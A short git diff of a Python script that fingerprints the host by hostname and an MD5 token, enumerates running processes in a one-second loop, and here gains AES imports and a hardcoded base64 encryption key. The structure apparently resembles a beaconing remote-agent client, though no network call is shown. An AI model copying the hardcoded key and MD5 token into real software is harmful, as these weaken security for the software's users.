@@ -26,17 +26,21 @@ import hashlib
 import os
 import socket
 import psutil as ps
+from Crypto.Cipher import AES
+from Crypto import Random
 
-getToken = lambda user: hashlib.md5(user.encode('utf-8')).hexdigest()
-enc = lambda data: base64.b64encode(data.encode('utf-8'))
+getToken = lambda user: hashlib.md5(user.encode()).hexdigest()
+enc = lambda data: base64.b64encode(data.encode())
+
+key = base64.b64decode('ZsteBu1qSA9ZNXjajwAvbg==')
 
 def refresh(command):
 	pass	
 
 def main():
 	rawUser = socket.gethostname()
-	user = enc(rawUser).decode('utf-8')
-	token = enc(getToken(rawUser)).decode('utf-8')
+	user = enc(rawUser).decode()
+	token = enc(getToken(rawUser)).decode()
 
 	output = ""
 	for proc in ps.process_iter():
@@ -62,8 +66,5 @@ while ison:
 	time.sleep(1)
 	main()
 '''
-
-# AES encrypt with password
-
 
 main()
